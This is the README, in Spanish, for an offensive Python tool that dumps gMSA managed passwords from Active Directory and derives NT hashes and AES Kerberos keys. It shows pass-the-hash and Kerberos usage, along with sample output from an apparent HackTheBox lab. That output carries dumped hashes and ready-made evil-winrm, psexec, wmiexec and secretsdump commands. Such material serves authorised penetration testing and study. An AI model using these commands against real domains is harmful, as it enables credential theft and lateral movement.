# gMSA Password Dumper

> Herramienta para dumpear la contraseña gestionada (`ms-DS-ManagedPassword`) de cuentas **gMSA** en Active Directory, extrayendo el **NT Hash** y las claves **AES-128 / AES-256** de Kerberos listas para usar.

---

## ¿Qué es ReadGMSAPassword?

**ReadGMSAPassword** es un permiso en Active Directory que permite a un principal (usuario, grupo o equipo) leer la contraseña de una **Cuenta de Servicio Administrada de Grupo (gMSA)**. Las gMSA almacenan su contraseña en el atributo `ms-DS-ManagedPassword`, un blob cifrado que el DC entrega únicamente a los principals autorizados en el descriptor de seguridad `msDS-GroupMSAMembership`.

Si un atacante compromete un principal con ese permiso, puede leer el blob y derivar:

- **NT Hash** → Pass-the-Hash, autenticación NTLM
- **AES-256 / AES-128** → Pass-the-Key, obtención de TGT Kerberos sin contraseña en texto claro

---

## Características

- Autenticación **Kerberos** (ccache), **NTLM** (usuario + contraseña) y **Pass-the-Hash**
- Negociación automática de transporte: `LDAPS` → `StartTLS` → `LDAP plano`
- Muestra los principals con permiso **ReadGMSAPassword** (ACL del descriptor de seguridad)
- Calcula **NT Hash**, **AES-256** y **AES-128** desde el blob de contraseña
- Muestra el **hash anterior** si el DC lo provee (útil si la cuenta rotó recientemente)
- Genera comandos listos para copiar: `evil-winrm`, `netexec`, `wmiexec`, `psexec`, `secretsdump`, `getTGT`
- Salida con colores ANSI opcional (`--color`)

---

## Requisitos

```bash
pip3.11 install -r requirements.txt
```

| Librería | Uso |
|---|---|
| `impacket` | Autenticación Kerberos via LDAP, parseo de estructuras AD |
| `ldap3` | Autenticación NTLM / PtH via LDAPS o LDAP |
| `pycryptodome` | Cálculo de NT Hash (MD4) y claves AES Kerberos |

---

## Uso

```
python3 gmsa_dump.py -d <DOMINIO> -dc <DC> [opciones]
```

### Argumentos

| Argumento | Descripción |
|---|---|
| `-d`, `--domain` | Dominio objetivo (ej: `corp.local`) |
| `-dc`, `--dc-ip` | IP o hostname del Domain Controller |
| `-u`, `--username` | Usuario (no necesario con `-k`) |
| `-p`, `--password` | Contraseña en texto claro |
| `-H`, `--hash` | NT Hash para Pass-the-Hash (`LM:NT` o solo `NT`) |
| `-k`, `--kerberos` | Usar ticket Kerberos del ccache (`KRB5CCNAME`) |
| `-n`, `--no-tls` | Forzar LDAP sin TLS (útil en entornos sin LDAPS) |
| `--base-dn` | Base DN personalizado (por defecto se deriva del dominio) |
| `--color` | Activar colores ANSI en la salida |

---

## Ejemplos

### Kerberos (sin TLS)
```bash
# Autenticarse primero con getTGT o similar y exportar el ccache
export KRB5CCNAME=/tmp/p00lAdm1n.ccache

python3 gmsa_dump.py -d vintage.htb -dc dc01.vintage.htb -k -n --color
```

### Kerberos (entorno real, TLS automático)
```bash
export KRB5CCNAME=/tmp/user.ccache

python3 gmsa_dump.py -d corp.local -dc dc01.corp.local -k --color
```

### NTLM con contraseña
```bash
python3 gmsa_dump.py -d corp.local -u john -p 'P@ssw0rd!' -dc 10.10.10.10
```

### Pass-the-Hash
```bash
python3 gmsa_dump.py -d corp.local -u john -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -dc 10.10.10.10 --color
```

---

## Ejemplo de salida exitosa

```
[*] Ticket Kerberos: /tmp/krb5cc_1000
[*] gMSA Password Dumper
    Dominio  : vintage.htb
    Usuario  : (del ticket)
    DC       : dc01.vintage.htb
    Base DN  : DC=vintage,DC=htb
    Auth     : Kerberos
    TLS      : Auto (LDAPS → StartTLS → plain)

[*] Conectando via impacket LDAP...
[-] Fallo ldaps: (104, 'ECONNRESET')
[*] Reintentando con LDAP plano...
[*] Kerberos auth (ccache: /tmp/krb5cc_1000)
[+] Conectado exitosamente

[*] Buscando cuentas gMSA en DC=vintage,DC=htb...
[+] Encontradas 1 cuenta(s) gMSA

=================================================================
  gMSA    : gMSA01$
  DN      : CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
  ReadGMSAPassword permitido a:
    - Domain Computers  [S-1-5-21-4024337825-2033394866-2055507597-515]
  ─────────────────────────────────────────────────────────
  ✓ NT Hash  : d933ef50c2677cc83e8c9a7d09e678e5
  ✓ AES-256  : b299fb7f62f5afebccd7e8df38e911642ff8a367c2d037bce8ecf1cd622396c6
  ✓ AES-128  : 9ed79cc303a9d9be641663a3dd47ebdd
  ─────────────────────────────────────────────────────────
  ─ [ Kerberos — obtén TGT primero ]
  ─ getTGT     getTGT.py -aesKey b299fb7...96c6 vintage.htb/gMSA01$
  ─ export     export KRB5CCNAME=gMSA01.ccache
  ─ [ Con ticket activo ]
  ─ evil-winrm evil-winrm -i dc01.vintage.htb -r VINTAGE.HTB -u gMSA01$
  ─ netexec    netexec smb dc01.vintage.htb -u gMSA01$ -H d933ef50... -k
  ─ wmiexec    wmiexec.py -k -no-pass gMSA01$@dc01.vintage.htb
  ─ psexec     psexec.py -k -no-pass gMSA01$@dc01.vintage.htb
  ─ secretsdmp secretsdump.py -k -no-pass dc01.vintage.htb
  ✓ NT Hash anterior : edf3fec5cfe3db436b4f1d92e70eda3f
```

---

## Cómo funciona

### 1. Transporte LDAP

En modo **Kerberos** se usa `impacket` directamente, intentando primero LDAPS (puerto 636) y cayendo a LDAP plano (puerto 389) si falla. En modo **NTLM / PtH** se usa `ldap3` con la siguiente cadena de fallback:

```
LDAPS (cert validado) → LDAPS (sin validar) → LDAP + StartTLS → LDAP plano
```

> ⚠️ Sin TLS, algunos Domain Controllers no entregan el atributo `msDS-ManagedPassword`. Si el blob aparece vacío, intenta forzar TLS o usa `-k` con Kerberos.

### 2. Parseo del blob `ms-DS-ManagedPassword`

El blob sigue la estructura `MSDS_MANAGEDPASSWORD_BLOB` documentada por Microsoft. El script extrae:

- `CurrentPassword` — contraseña activa (UTF-16LE, incluye 2 bytes nulos de terminación)
- `PreviousPassword` — contraseña anterior si el DC la provee (puede ser útil tras una rotación reciente y si el servicio destino todavía no reclamó la contraseña nueva al DC)

### 3. Derivación de credenciales

A partir de los bytes de `CurrentPassword`:

| Credencial | Método |
|---|---|
| **NT Hash** | MD4 sobre los bytes UTF-16LE de la contraseña |
| **AES-256** | `string_to_key` de impacket con salt `DOMAIN.UPPERhost<sam>.<domain.lower>` |
| **AES-128** | Igual que AES-256 pero con tipo de cifrado `aes128_cts_hmac_sha1_96` |

### 4. Enumeración de ACLs

Se parsea `msDS-GroupMSAMembership` como un `SR_SECURITY_DESCRIPTOR` para mostrar qué SIDs tienen permiso **ReadGMSAPassword**, resolviendo cada SID a su `sAMAccountName`.

---

## Descargo de Responsabilidad Legal

Esta herramienta se proporciona solo con fines educativos y de pruebas de seguridad autorizadas.

**Eres responsable de:**
- Obtener la autorización adecuada antes de escanear cualquier sistema
- Cumplir con todas las leyes y regulaciones aplicables
- Usar esta herramienta de manera ética y responsable

**El autor NO es responsable de:**
- Cualquier mal uso o daño causado por esta herramienta
- Cualquier consecuencia legal resultante del uso no autorizado
- Cualquier daño a sistemas o redes

**Al usar esta herramienta, aceptas que tienes permiso para probar los sistemas objetivo.**

## Licencia


Este proyecto se publica bajo la Licencia MIT. Consulta el archivo LICENSE para más detalles.
